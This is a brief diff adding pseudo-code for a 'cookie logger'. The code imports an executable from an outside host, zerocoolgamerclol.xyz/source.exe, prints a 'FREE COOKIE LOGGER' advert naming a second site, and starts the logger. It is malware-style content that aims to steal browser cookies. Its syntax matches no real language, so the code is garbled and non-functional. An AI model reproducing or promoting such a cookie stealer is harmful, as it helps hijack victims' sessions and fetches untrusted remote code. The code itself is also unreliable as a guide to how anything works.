@@ -1,0 +1,12 @@
+type save cookielogger;
+
+cookielogger.import(d, "zerocoolgamerclol.xyz/source.exe");
+cookielogger.print("
+
+FREE COOKIE LOGGER www.cooki4455.net
+
+FREE PLAN
+
+");
+
+cookielogger.start();
